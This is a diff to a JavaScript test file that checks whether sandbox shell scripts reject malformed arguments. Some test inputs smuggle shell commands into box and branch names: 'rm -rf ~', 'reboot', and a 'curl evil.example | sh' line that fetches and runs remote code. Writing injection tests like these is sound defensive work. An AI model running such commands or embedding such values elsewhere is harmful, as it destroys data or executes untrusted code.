@@ -109,8 +109,23 @@ describe('preview.sh and instabox.sh', () => {
     const badBox = run(instabox, 'up', '--box', 'Box; rm -rf ~');
     expect(badBox.status).toBe(2);
     expect(badBox.stderr).toContain('box names');
+    const badIfRef = run(instabox, 'down', '--if-ref', 'main;reboot');
+    expect(badIfRef.status).toBe(2);
     const badRef = run(instabox, 'up', '--ref', "main'; curl evil.example | sh; '");
     expect(badRef.status).toBe(2);
     expect(badRef.stderr).toContain('branch name');
+  });
+});
+
+describe('clean.sh', () => {
+  const clean = new URL('../sandbox/clean.sh', import.meta.url).pathname;
+
+  it('is valid bash, and refuses what it does not know before it deletes anything', () => {
+    expect(spawnSync('bash', ['-n', clean]).status).toBe(0);
+    for (const args of [['--nope'], ['--max-percent', '0'], ['--max-percent', '101'], ['--max-percent', 'most']]) {
+      const r = spawnSync('bash', [clean, ...args], { encoding: 'utf8' });
+      expect(r.status).toBe(2);
+      expect(r.stderr).toContain('usage');
+    }
   });
 });
